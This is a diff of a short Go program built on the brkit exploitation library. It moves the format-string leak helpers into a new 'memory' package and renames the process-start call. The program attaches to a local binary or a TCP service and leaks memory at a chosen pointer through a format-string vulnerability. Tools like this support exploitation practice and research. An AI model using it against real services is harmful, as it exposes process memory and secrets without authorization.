@@ -9,6 +9,7 @@ import (
 	"strconv"
 	"strings"
 
+	"github.com/stephen-fox/brkit/memory"
 	"github.com/stephen-fox/brkit/process"
 )
 
@@ -22,7 +23,7 @@ func main() {
 		proc = process.DialOrExit("tcp", flag.Arg(0))
 	} else {
 		cmd := exec.Command(flag.Arg(0))
-		proc = process.ExecOrExit(cmd)
+		proc = process.StartOrExit(cmd)
 		log.Printf("pid: %d", cmd.Process.Pid)
 	}
 
@@ -30,8 +31,8 @@ func main() {
 		proc.SetLogger(log.New(log.Writer(), log.Prefix(), log.Flags()))
 	}
 
-	leaker := process.LeakUsingFormatStringDirectParamOrExit(process.FormatStringDirectParamConfig{
-		GetProcessFn: func() *process.Process {
+	leaker := memory.LeakUsingFormatStringDirectParamOrExit(memory.FormatStringDirectParamConfig{
+		ProcessIOFn: func() memory.ProcessIO {
 			return proc
 		},
 		MaxNumParams: 200,
@@ -52,7 +53,7 @@ func main() {
 		log.Fatalln(err)
 	}
 
-	raw := leaker.MemoryAtOrExit(process.PointerMakerForX86().U64(pointer), proc)
+	raw := leaker.MemoryAtOrExit(memory.PointerMakerForX86().U64(pointer), proc)
 
 	log.Printf("read: 0x%x", raw)
 }
